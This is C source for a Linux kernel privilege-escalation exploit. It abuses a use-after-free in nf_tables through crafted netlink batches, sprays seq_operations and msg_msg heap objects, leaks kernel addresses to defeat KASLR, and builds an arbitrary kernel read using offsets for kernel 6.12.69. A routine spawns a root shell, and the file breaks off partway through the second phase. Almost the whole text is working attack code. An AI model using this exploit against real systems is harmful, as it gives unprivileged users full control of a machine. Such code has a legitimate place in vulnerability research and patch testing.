#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stddef.h>                   
#include <netinet/in.h>                 
#include <netinet/ip.h>                
#include <fcntl.h>
#include <unistd.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <libnftnl/set.h>               

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <signal.h>


// Phase 1 constants 
#define TABLE_NAME      "BASE_TABLE"
#define BASE_CHAIN      "BASE_CHAIN"
#define BASE_RULE       "BASE_RULE"
#define DUMMY_CHAIN     "DUMMY_CHAIN"
#define VICTIM_CHAIN    "VICTIM_VICTIM_CHAIN" // ensure this gets allocated by kmalloc-cg-32, so size must be AT LEAST 17
#define TRIGGER_MAP     "TRIGGER_MAP"
#define TRIGGER_MAP_ID  1
#define NUM_SEQOPS      512 // kmalloc-cg-32 cache has max 128 objs. this will ensure we fill the pages

// SET TO 1 IF DEBUG WANTED
#define DEBUG 0
#define PAGE_SIZE 0x1000

// Phase 2 constants
#define PHASE2_TABLE_NAME       "BASE_TABLE_2"
#define PHASE2_BASE_CHAIN       "BASE_CHAIN_2"
#define PHASE2_BASE_RULE        "BASE_RULE_2"
#define PHASE2_VICTIM_CHAIN     "VICTIM_VICTIM_CHAIN2"
#define PHASE2_TRIGGER_MAP      "TRIGGER_MAP_2"
#define PHASE2_TRIGGER_MAP_ID   2

#define XA_TAG_MASK             3UL

struct msg_msgseg {
    uint64_t next;
};

struct msg_msg {
    uint64_t m_list_next;
    uint64_t m_list_prev;
    uint64_t m_type;
    uint64_t m_ts;
    uint64_t next;
    uint64_t security;
};

// msg_msg stuff
#define NUM_MSQIDS 4096 // define larger than normal so we have a higher chance of success when spraying
#define MSG_TAG 0X41424344
#define MSG_MSG_SIZE (sizeof(struct msg_msg))
#define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))
#define INIT_IPC_NS_OFFSET 0x1fe2340

enum { NFT_DT_IPADDR = 7 };             /* nft userspace datatype id for ipv4_addr */
static uint32_t seq;
uint64_t leaked_addr = 0; // global var for leaking
uint64_t kbase = 0;
uint64_t xa_node_addr = 0;
uint64_t xa_node_addr2 = 0;
uint64_t msg_queue_addr = 0;
uint64_t heap_addr = 0;

int msqid[NUM_MSQIDS];

struct {
  long mtype;
  char mtext[64 - MSG_MSG_SIZE];
} message;


struct {
    long mtype;
    char mtext[2048 - MSG_MSG_SIZE];
} msg_msg_2k;

struct msg_envelope {
    long mtype;       // Target message type (must be > 0)
    char mtext[1024]; // The actual data payload
};

struct {
    long mtype;
    char mtext[PAGE_SIZE - MSG_MSG_SIZE + 128 - MSG_MSGSEG_SIZE];
} msg_rop;

// Save state
unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[+] Saved state");
}

// get shell
void get_shell(void){
    puts("[+] Returned to userland");
    if (getuid() == 0){
        printf("[+] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}
unsigned long user_rip = (unsigned long)get_shell;


/* ---------------------------------------------------------------------------
 * Shared netlink helpers
 * ------------------------------------------------------------------------- */

/* Open and bind an nfnetlink socket; returns NULL on failure. */
static struct mnl_socket *nl_open(uint32_t *portid)
{
    struct mnl_socket *nl = mnl_socket_open(NETLINK_NETFILTER);
    if (!nl) { perror("mnl_socket_open"); return NULL; }

    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
        perror("mnl_socket_bind");
        mnl_socket_close(nl);
        return NULL;
    }
    *portid = mnl_socket_get_portid(nl);
    return nl;
}

/* Send a finished batch and drain all ACKs. Returns 0 on success, -1 if the
 * kernel rejected any message in the transaction. */
static int nl_talk(struct mnl_socket *nl, struct mnl_nlmsg_batch *batch,
                   uint32_t portid)
{
    char buf[MNL_SOCKET_BUFFER_SIZE * 2];
    int ret;

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0) {
        perror("mnl_socket_sendto");
        return -1;
    }

    ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
    while (ret > 0) {
        ret = mnl_cb_run(buf, ret, 0, portid, NULL, NULL);
        if (ret <= 0)
            break;
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
    }
    if (ret < 0) {
        perror("netlink transaction");
        return -1;
    }
    return 0;
}


/* ---------------------------------------------------------------------------
 * Creation
 * ------------------------------------------------------------------------- */


static int setup(struct mnl_socket *nl, uint32_t portid, 
    char *table_name, char *b_chain, char *victim_chain, char *trigger_map, int trigger_map_ID) {
    struct nftnl_table     *table;
    struct nftnl_chain     *base_chain, *reg_chain;
    struct nftnl_set       *set, *trigger_set;
    struct nftnl_expr      *expr;
    struct nftnl_rule      *rule1;
    struct nftnl_set_elem  *elem, *elem2;
    struct nlmsghdr        *nlh;
    struct mnl_nlmsg_batch *batch;
    char buf[MNL_SOCKET_BUFFER_SIZE * 2];
    int ret;

    /* 1. Table -------------------------------------------------------- */
    table = nftnl_table_alloc();
    if (!table) { perror("nftnl_table_alloc"); return -1; }
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

    /* 2. Regular chain ------------------------------------------------ */
    reg_chain = nftnl_chain_alloc();
    if (!reg_chain) { perror("nftnl_chain_alloc"); return -1; }
    nftnl_chain_set_str(reg_chain, NFTNL_CHAIN_TABLE, table_name);
    nftnl_chain_set_str(reg_chain, NFTNL_CHAIN_NAME, victim_chain);

    /* Base chain */
    base_chain = nftnl_chain_alloc();
    if (!base_chain) { perror("nftnl_chain_alloc"); exit(1); }
    nftnl_chain_set_str(base_chain, NFTNL_CHAIN_TABLE, table_name);
    nftnl_chain_set_str(base_chain, NFTNL_CHAIN_NAME, b_chain);
    nftnl_chain_set_u32(base_chain, NFTNL_CHAIN_HOOKNUM, NF_INET_LOCAL_IN);
    nftnl_chain_set_u32(base_chain, NFTNL_CHAIN_PRIO, 0);
    nftnl_chain_set_u32(base_chain, NFTNL_CHAIN_POLICY, NF_ACCEPT);

    /* Rule 1: immediate NFT_GOTO to victim_chain */
    rule1 = nftnl_rule_alloc();
    if (!rule1) { perror("nftnl_rule_alloc"); exit(1); }
    // FIX: Target the table and chain you actually created above
    nftnl_rule_set_str(rule1, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(rule1, NFTNL_RULE_CHAIN, b_chain);

    expr = nftnl_expr_alloc("immediate");
    if (!expr) { perror("nftnl_expr_alloc"); exit(1); }
    nftnl_expr_set_u32(expr, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
    nftnl_expr_set_u32(expr, NFTNL_EXPR_IMM_VERDICT, NFT_GOTO);
    // FIX: Use the macro variable instead of the hardcoded string "regulars"
    nftnl_expr_set_str(expr, NFTNL_EXPR_IMM_CHAIN, victim_chain);
    nftnl_rule_add_expr(rule1, expr);


    // Map 2, also has a verdict that points to victim_chain
    trigger_set = nftnl_set_alloc();
    if (!trigger_set) { perror("nftnl_set_alloc"); return -1; }
    nftnl_set_set_str(trigger_set, NFTNL_SET_TABLE,   table_name);
    nftnl_set_set_str(trigger_set, NFTNL_SET_NAME,    trigger_map);
    nftnl_set_set_u32(trigger_set, NFTNL_SET_FAMILY,  NFPROTO_IPV4);
    nftnl_set_set_u32(trigger_set, NFTNL_SET_ID,      trigger_map_ID);
    nftnl_set_set_u32(trigger_set, NFTNL_SET_FLAGS,   NFT_SET_MAP);
    nftnl_set_set_u32(trigger_set, NFTNL_SET_KEY_TYPE, NFT_DT_IPADDR);          /* ipv4_addr */
    nftnl_set_set_u32(trigger_set, NFTNL_SET_KEY_LEN,  sizeof(struct in_addr)); /* 4 */
    nftnl_set_set_u32(trigger_set, NFTNL_SET_DATA_TYPE, NFT_DATA_VERDICT);

    elem2 = nftnl_set_elem_alloc();
    if (!elem2) { perror("nftnl_set_elem_alloc"); return -1; }
    nftnl_set_elem_set_u32(elem2, NFTNL_SET_ELEM_FLAGS, NFT_SET_ELEM_CATCHALL);
    nftnl_set_elem_set_u32(elem2, NFTNL_SET_ELEM_VERDICT, NFT_GOTO);
    nftnl_set_elem_set_str(elem2, NFTNL_SET_ELEM_CHAIN, victim_chain);
    nftnl_set_elem_add(trigger_set, elem2);      /* the trigger_set now owns `elem2` */


    /* 4. Build the batch (one transaction) ---------------------------- *
     * Every object uses the GENERIC header builder nftnl_nlmsg_build_hdr();
     * there is no per-type *_nlmsg_build_hdr in current libnftnl.        */
    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // table
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_NEWTABLE, NFPROTO_IPV4,
                                NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_table_nlmsg_build_payload(nlh, table);
    nftnl_table_free(table);
    mnl_nlmsg_batch_next(batch);

    /* victim_chain must exist before anything goto/jumps to it */
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_NEWCHAIN, NFPROTO_IPV4,
                                NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, reg_chain);
    nftnl_chain_free(reg_chain);
    mnl_nlmsg_batch_next(batch);

    // base_chain
    nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWCHAIN, NFPROTO_IPV4, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, base_chain);
    nftnl_chain_free(base_chain);
    mnl_nlmsg_batch_next(batch);

    // rule1
    nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWRULE, NFPROTO_IPV4, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rule1);
    nftnl_rule_free(rule1);
    mnl_nlmsg_batch_next(batch);

    // trigger_set
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_NEWSET, NFPROTO_IPV4,
                                NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_set_nlmsg_build_payload(nlh, trigger_set);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_NEWSETELEM, NFPROTO_IPV4,
                                NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_set_elems_nlmsg_build_payload(nlh, trigger_set);
    nftnl_set_free(trigger_set);    /* frees the set AND its attached elements */
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // sends the entire batch to create tables and stuff
    ret = nl_talk(nl, batch, portid);
    mnl_nlmsg_batch_stop(batch);

    return ret;
}


// triggers deletion, then abort
static int batch1(struct mnl_socket *nl, uint32_t portid, char *table_name, char *trigger_map) {   
    struct nftnl_rule      *flush;
    struct nftnl_set       *set;
    struct nlmsghdr        *nlh;
    struct nftnl_set       *set2;
    struct mnl_nlmsg_batch *batch;
    char buf[MNL_SOCKET_BUFFER_SIZE * 2];
    int ret;


    if (DEBUG) {
        printf("[DEBUG] In GDB: 'b nft_delchain'\n");
        getchar();
    }

    /* the map to delete: identified by table + name */
    set = nftnl_set_alloc();
    if (!set) { perror("nftnl_set_alloc"); return -1; }
    nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set, NFTNL_SET_NAME,  trigger_map);

    /* invalid map to delete, trying to find it leads to aborting somehow?? :D */
    set2 = nftnl_set_alloc();

    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);


    // Deletes the set
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_DELSET, NFPROTO_IPV4,
                                NLM_F_ACK, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set);
    nftnl_set_free(set);
    mnl_nlmsg_batch_next(batch);

    // Within same batch, we need to trigger an error...
    // trigger deletion of invalid map...
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_DELSET, NFPROTO_IPV4,
                                NLM_F_ACK, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set2);
    nftnl_set_free(set2);
    mnl_nlmsg_batch_next(batch);
    

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    ret = nl_talk(nl, batch, portid);
    mnl_nlmsg_batch_stop(batch);

    return ret;
}

// creates a dummy chain to toggle table generation
static int batch2(struct mnl_socket *nl, uint32_t portid, char *table_name, char *dum_chain) {
    struct nftnl_chain     *dummy_chain;
    struct nlmsghdr        *nlh;
    struct mnl_nlmsg_batch *batch;
    char buf[MNL_SOCKET_BUFFER_SIZE * 2];
    int ret;

    dummy_chain = nftnl_chain_alloc();
    if (!dummy_chain) { perror("nftnl_chain_alloc"); return -1; }
    nftnl_chain_set_str(dummy_chain, NFTNL_CHAIN_TABLE, table_name);
    nftnl_chain_set_str(dummy_chain, NFTNL_CHAIN_NAME, dum_chain);

    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // Create the chain now..
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_NEWCHAIN, NFPROTO_IPV4,
                                NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, dummy_chain);
    nftnl_chain_free(dummy_chain);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    ret = nl_talk(nl, batch, portid);
    mnl_nlmsg_batch_stop(batch);
    
    
    return ret;
}

// deletes PIPAPO, so it looks like VICTIM_CHAIN has nothing pointing to it
static int batch3(struct mnl_socket *nl, uint32_t portid, char *table_name, char *trigger_map) {
    struct nftnl_rule      *flush;
    struct nftnl_set       *set;
    struct nlmsghdr        *nlh;
    struct mnl_nlmsg_batch *batch;
    char buf[MNL_SOCKET_BUFFER_SIZE * 2];
    int ret;


    /* the map to delete: identified by table + name */
    set = nftnl_set_alloc();
    if (!set) { perror("nftnl_set_alloc"); return -1; }
    nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set, NFTNL_SET_NAME,  trigger_map);

    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);
    
    // Deletes the set
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_DELSET, NFPROTO_IPV4,
                                NLM_F_ACK, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set);
    nftnl_set_free(set);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    ret = nl_talk(nl, batch, portid);
    mnl_nlmsg_batch_stop(batch);


}


// perform deletion of VICTIM_CHAIN
static int batch4(struct mnl_socket *nl, uint32_t portid, char *table_name, char *victim_chain) {
    struct nftnl_chain       *reg_chain;
    struct nlmsghdr        *nlh;
    struct mnl_nlmsg_batch *batch;
    char buf[MNL_SOCKET_BUFFER_SIZE * 2];
    int ret;

    /* the chain to delete: identified by table + name */
    reg_chain = nftnl_chain_alloc();
    if (!reg_chain) { perror("nftnl_set_alloc"); return -1; }
    nftnl_chain_set_str(reg_chain, NFTNL_CHAIN_TABLE, table_name);
    nftnl_chain_set_str(reg_chain, NFTNL_CHAIN_NAME,  victim_chain);

    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // Deletes the reg_chain
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_DELCHAIN, NFPROTO_IPV4,
                                NLM_F_ACK, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, reg_chain);
    nftnl_chain_free(reg_chain);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    ret = nl_talk(nl, batch, portid);
    mnl_nlmsg_batch_stop(batch);


    return ret;
}


/* ---------------------------------------------------------------------------
 * Callback functions!
 * ------------------------------------------------------------------------- */

int leak_cb(const struct nlmsghdr *nlh, void *data) {
    struct nftnl_rule *r;

    r = nftnl_rule_alloc();
    nftnl_rule_nlmsg_parse(nlh, r);
    nftnl_expr_foreach(r, data, NULL);
    nftnl_rule_free(r);
    
    return MNL_CB_OK;
}

int leak_expr_cb(struct nftnl_expr *e, void *dat) {
    const char *data;
    leaked_addr = 0;
    data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
    leaked_addr = *(uint64_t *)data;

    printf("[+] Leak: 0x%llx\n", leaked_addr);

    return MNL_CB_OK;
}

int leak_xa_node(struct nftnl_expr *e, void *dat) {   
    unsigned char leak_buf[64];
    const char *data;
    data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
    sleep(1);
    memset(leak_buf, 0, sizeof(leak_buf));
    memcpy(leak_buf, data, sizeof(leak_buf));
    xa_node_addr = *(uint64_t *)data & ~XA_TAG_MASK; // for byte alignment
    printf("[leak_xa_node] struct xa_node addr: 0x%llx\n", xa_node_addr);

    return MNL_CB_OK;
}

int leak_xa_node2(struct nftnl_expr *e, void *dat) {   
    unsigned char leak_buf[64];
    const char *data;
    data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
    sleep(1);
    memset(leak_buf, 0, sizeof(leak_buf));
    memcpy(leak_buf, data, sizeof(leak_buf));
    xa_node_addr2 = *(uint64_t *)data;
    printf("[leak_xa_node2] struct xa_node addr: 0x%llx\n", xa_node_addr2);

    return MNL_CB_OK;
}


int leak_msg_queue(struct nftnl_expr *e, void *dat) {   
    unsigned char leak_buf[64];
    const char *data;
    data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
    sleep(1);
    memset(leak_buf, 0, sizeof(leak_buf));
    memcpy(leak_buf, data, sizeof(leak_buf));
    // msg_queue_addr is kmalloc'd, and size is 0x100
    // so it'll always be byte aligned at 0x100
    // and also, because of how nftnl_expr_get_str works (null-byte termination)
    // we need to do bitshifting after purposefully reading
    // at offset 0x29 instead of 0x28
    msg_queue_addr = (*(uint64_t *)data) << 8; 
    printf("[*] struct msg_queue address: 0x%llx\n", msg_queue_addr);

    return MNL_CB_OK;
}


int leak_heap_addr(struct nftnl_expr *e, void *dat) {   
    unsigned char leak_buf[64];
    const char *data;
    data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
    sleep(1);
    memset(leak_buf, 0, sizeof(leak_buf));
    memcpy(leak_buf, data, sizeof(leak_buf));
    heap_addr = (*(uint64_t *)data) << 8;
    printf("[*] heap (kmalloc-cg-2k) address: 0x%llx\n", heap_addr);

    return MNL_CB_OK;
}

// Steps:
// 1. Reclaim freed space originally occupied by chain->name by spraying seqops
// 2. At the offset of rule->name (which is being read), the address of
// the function single_start will be placed there
// so, we will leak the address of single_start
// this allows us to get the kernel base address
void phase1_leak(struct mnl_socket *nl, uint32_t portid) {
    int seqops[NUM_SEQOPS];
    struct nlmsghdr        *nlh;
    struct mnl_nlmsg_batch *batch;
    char buf[MNL_SOCKET_BUFFER_SIZE * 2];

    printf("[*] spraying seq_operations to fill kmalloc-cg-32...\n");
    for (int i = 0; i < NUM_SEQOPS; i++) {
        seqops[i] = open("/proc/self/stat", O_RDONLY);

        if (seqops[i] < 0) {
            perror("[!] open");
            exit(-1);
        }
    }

    // function single_start is at offset 0x4a9710 for 6.12.69
    uint64_t k_single_start = 0x4a9710; 
    leaked_addr = 0;
    int err = 0;
    
    printf("[+] leaking...\n");
    struct nftnl_rule *rleak = nftnl_rule_alloc();
    nftnl_rule_set_u32(rleak, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
    nftnl_rule_set_str(rleak, NFTNL_RULE_TABLE, TABLE_NAME);
    // BASE_CHAIN doesn't exist anymore, but because we have a ref to it
    // we can still read it, and reading BASE_CHAIN will read 
    // whatever object has been allocated into kmalloc-cg-32 space
    nftnl_rule_set_str(rleak, NFTNL_RULE_CHAIN, BASE_CHAIN);
    uint32_t rseq = seq;
    
    nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, NFPROTO_IPV4, NLM_F_DUMP, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rleak);
    mnl_socket_sendto(nl, buf, nlh->nlmsg_len);
    
    while (rseq < seq) {
        err = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        err = mnl_cb_run(buf, err, rseq, mnl_socket_get_portid(nl), leak_cb, leak_expr_cb);
        rseq += err == 0;
    }
    nftnl_rule_free(rleak);
    kbase = leaked_addr - k_single_start;
    printf("kernel base addr: 0x%llx\n", kbase);
}



void phase1(struct mnl_socket *nl, uint32_t portid) {
    setup(nl, portid, TABLE_NAME, BASE_CHAIN, VICTIM_CHAIN, TRIGGER_MAP, TRIGGER_MAP_ID);
    batch1(nl, portid, TABLE_NAME, TRIGGER_MAP);
    batch2(nl, portid, TABLE_NAME, DUMMY_CHAIN);
    batch3(nl, portid, TABLE_NAME, TRIGGER_MAP);
    batch4(nl, portid, TABLE_NAME, VICTIM_CHAIN);
    sleep(1); // need to sleep for kernel workqueue cleanup...
    phase1_leak(nl, portid);
}

// NOTE: ensure no '00' bytes in target address, otherwise it WILL fail
// because the table being built reads it as a string, seeing '00' will
// result in NULL BYTE and terminate early.
int build_exp_table(struct mnl_socket *nl, uint32_t portid, uint64_t target) {
    struct nftnl_table     *table;
    struct nlmsghdr        *nlh;
    struct mnl_nlmsg_batch *batch;
    char buf[MNL_SOCKET_BUFFER_SIZE * 2];
    int ret;
    
    uint8_t payload[128];
    uint offset = 0;
    memset(&payload[offset], 'A', 88);
    offset += 88;

    // resolves to ff ff ff ff, 81 00 00 00 in memory
    // BUT: cannot have 00 as bytes. OTHERWISE IT WILL FAIL AS IT IS SEEN AS
    // NULL BYTE!!
    memcpy(&payload[offset], &target, sizeof(target));
    offset += sizeof(target);

    memset(&payload[offset], 'B', 12);
    offset += 12;

    if (DEBUG) {
        printf("[DEBUG] before alloc -- check slub-dump kmalloc-cg-128\n");
        getchar();
    }

    table = nftnl_table_alloc();
    if (!table) { perror("nftnl_table_alloc"); return -1; }
    nftnl_table_set_data(table, NFTNL_TABLE_NAME, payload, offset);
    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_NEWTABLE, NFPROTO_IPV4,
                                NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_table_nlmsg_build_payload(nlh, table);
    nftnl_table_free(table);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // sends the entire batch to create tables and stuff
    ret = nl_talk(nl, batch, portid);
    mnl_nlmsg_batch_stop(batch);

    if (ret == 0) {
        // printf("[+] should have created table\n");
        if (DEBUG) {
            printf("[DEBUG] after alloc -- check slub-dump kmalloc-cg-128\n");
            getchar();
        }
        return 0;
    }
    return -1;
}

void phase2_leak(struct mnl_socket *nl, uint32_t portid, uint64_t target, void* fn_ptr) {
    struct nlmsghdr        *nlh;
    struct mnl_nlmsg_batch *batch;
    char buf[MNL_SOCKET_BUFFER_SIZE * 2];
    int ret;
    int err;

    // FuzzingLabs' approach:
    // Force allocation of nft_table->name into the freed (nft_chain) slot
    // This is done by ensuring length of nft_table->name > 96
    // We can control what is being leaked from chain->name by placing an address
    // at offset 88. To leak kernel memory, read the rule referencing the deleted nft_chain
    build_exp_table(nl, portid, target);


    // leak
    struct nftnl_rule *rleak = nftnl_rule_alloc();
    nftnl_rule_set_u32(rleak, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
    nftnl_rule_set_str(rleak, NFTNL_RULE_TABLE, PHASE2_TABLE_NAME);
    // BASE_CHAIN doesn't exist anymore, but because we have a ref to it
    // we can still read it, and reading BASE_CHAIN will read 
    // whatever object has been allocated into kmalloc-cg-32 space
    nftnl_rule_set_str(rleak, NFTNL_RULE_CHAIN, PHASE2_BASE_CHAIN);
    uint32_t rseq = seq;
    
    nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, NFPROTO_IPV4, NLM_F_DUMP, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rleak);
    mnl_socket_sendto(nl, buf, nlh->nlmsg_len);
    
    while (rseq < seq) {
        err = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        err = mnl_cb_run(buf, err, rseq, mnl_socket_get_portid(nl), leak_cb, fn_ptr);
        rseq += err == 0;
    }
    nftnl_rule_free(rleak);

}   

void phase2(struct mnl_socket *nl, uint32_t portid) {

    printf("[*] Phase 2: upgrading primitive to arbitrary read, then leaking kernel memory\n");
    // setup and execute UAF
    setup(nl, portid, PHASE2_TABLE_NAME, PHASE2_BASE_CHAIN, PHASE2_VICTIM_CHAIN, PHASE2_TRIGGER_MAP, PHASE2_TRIGGER_MAP_ID);
    batch1(nl, portid, PHASE2_TABLE_NAME, PHASE2_TRIGGER_MAP);
    batch2(nl, portid, PHASE2_TABLE_NAME, DUMMY_CHAIN);
    batch3(nl, portid, PHASE2_TABLE_NAME, PHASE2_TRIGGER_MAP);
    // printf("***************before delete*********************\n");
    batch4(nl, portid, PHASE2_TABLE_NAME, PHASE2_VICTIM_CHAIN);
    sleep(1);

    printf("[*] Setup queue msg\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
            perror("[!] msgget failed");
            exit(-1);
        }
    }

    // Spray kmalloc-2k so we can leak it later
    printf("[*] spray kmalloc-2k so we can leak it\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&msg_msg_2k, 0, sizeof(msg_msg_2k));
        *(long *)&msg_msg_2k.mtype = 0x43;
        *(int *)&msg_msg_2k.mtext[0] = MSG_TAG;
        *(int *)&msg_msg_2k.mtext[4] = i;
        if (msgsnd(msqid[i], &msg_msg_2k, sizeof(msg_msg_2k) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    sleep(1); // let messages be processed first
    // 4 leaks required
    // leak 1: init_ipc_ns->ipc_ids->xa_head
    // leak 2: xa_head->node[0] -- gets leaf_node addr
    // leak 3: xa_head->node[0] again -- this time, gets struct msg_queue addr
    // leak 4: msg_queue->q_messages - gets heap addr



    // LEAK 1: struct xa_node, first node
    printf("============ [LEAK ADDRESS (XA_NODE): 0x%llx] ============\n", kbase+INIT_IPC_NS_OFFSET+0x118);
    phase2_leak(nl, portid, kbase+INIT_IPC_NS_OFFSET+0x118, leak_xa_node);
    printf("\n");
    // flush to reset tables before performing next leak
    system("nft flush ruleset");
    sleep(1);



    // LEAK 2: struct xa_node, leaf node
    setup(nl, portid, PHASE2_TABLE_NAME, PHASE2_BASE_CHAIN, PHASE2_VICTIM_CHAIN, PHASE2_TRIGGER_MAP, PHASE2_TRIGGER_MAP_ID);
    batch1(nl, portid, PHASE2_TABLE_NAME, PHASE2_TRIGGER_MAP);
    batch2(nl, portid, PHASE2_TABLE_NAME, DUMMY_CHAIN);
    batch3(nl, portid, PHASE2_TABLE_NAME, PHASE2_TRIGGER_MAP);
    batch4(nl, portid, PHASE2_TABLE_NAME, PHASE2_VICTIM_CHAIN); 
    sleep(1);
    printf("============ [LEAK 2 ADDRESS (LEAF NODE): 0x%llx] ============\n", xa_node_addr+0x28);
    phase2_leak(nl, portid, xa_node_addr+0x28, leak_xa_node); // gets leaf node address
    printf("\n");
    system("nft flush ruleset");
    sleep(1);


    // leaf_node->slots[0] -- which is a struct msg_queue
    setup(nl, portid, PHASE2_TABLE_NAME, PHASE2_BASE_CHAIN, PHASE2_VICTIM_CHAIN, PHASE2_TRIGGER_MAP, PHASE2_TRIGGER_MAP_ID);
    batch1(nl, portid, PHASE2_TABLE_NAME, PHASE2_TRIGGER_MAP);
    batch2(nl, portid, PHASE2_TABLE_NAME, DUMMY_CHAIN);
    batch3(nl, portid, PHASE2_TABLE_NAME, PHASE2_TRIGGER_MAP);
    batch4(nl, portid, PHASE2_TABLE_NAME, PHASE2_VICTIM_CHAIN);
    sleep(1);
    printf("============ [LEAK 3 ADDRESS (STRUCT MSG_QUEUE): 0x%llx] ============\n", xa_node_addr+0x28);
    // NOTE: supposed to be xa_node_addr+0x28, not +0x29. but we need
    // to apply some tricks here in order to get the address out :(
